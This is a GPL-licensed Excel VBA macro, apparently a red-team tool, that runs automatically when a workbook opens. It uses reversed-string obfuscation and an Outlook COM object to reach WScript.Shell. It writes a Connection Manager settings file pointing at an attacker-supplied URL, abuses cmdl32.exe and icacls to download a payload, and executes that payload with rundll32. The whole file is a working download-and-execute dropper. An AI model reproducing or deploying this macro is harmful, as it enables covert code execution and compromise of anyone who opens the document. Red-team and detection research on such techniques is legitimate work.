<!--
# -------------------------------------------------------------------------------
# Copyright: (c) BLS OPS LLC.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# -------------------------------------------------------------------------------
-->
Sub tent(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Sub Workbook_Open()
    user = Environ("Username")
    Dim dpdp(0 To 3) As String
    rrea = StrReverse("<INFRASTRUCTURE_IN_REVERSE>//:sptth")
    dpdp(0) = StrReverse("\sresU\:C")
    dpdp(1) = user
    dpdp(2) = StrReverse("\foorP\tfosorciM\gnimaoR\ataDppA\")
    dpdp(3) = StrReverse("txt.sgnittes")
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile(dpdp(0) & dpdp(1) & dpdp(2) & dpdp(3), True)
    a.WriteLine ("[Connection Manager]" & vbNewLine & "CMSFile=settings.txt" & vbNewLine & "ServiceName=WindowsUpdate" & vbNewLine & "TunnelFile=settings.txt" & vbNewLine & "[Settings]" & vbNewLine & "UpdateUrl=" & rrea)
    a.Close

    Set objShell = GetObject("new:{0006F03A-0000-0000-C000-000000000046}")
    Dim p1 As String
    Dim p2 As String
    p1 = ".tpircSW"
    p2 = "llehS"

    Dim objUserEnvVars As Object
    Set objUserEnvVars = CreateObject(StrReverse(p1) + StrReverse(p2)).Environment("User")

    objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "icacls.exe " & dpdp(0) & dpdp(1) & dpdp(2) & " /deny %username%:(OI)(CI)(DE,DC)", 0, True
    
    tent 5
    
    objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "cmdl32.exe /vpn /lan " & dpdp(0) & dpdp(1) & dpdp(2) & dpdp(3), 0, True
    
    tent 5
    
    objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "icacls.exe " & dpdp(0) & dpdp(1) & dpdp(2) & " /remove:d %username%", 0, True

    tent 5

    Dim sfile As String
    sfile = Dir(dpdp(0) & dpdp(1) & dpdp(2) & "VPN*.TMP")
    objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "rundll32.exe " & dpdp(0) & dpdp(1) & dpdp(2) & sfile & ",Main", 0, True
End Sub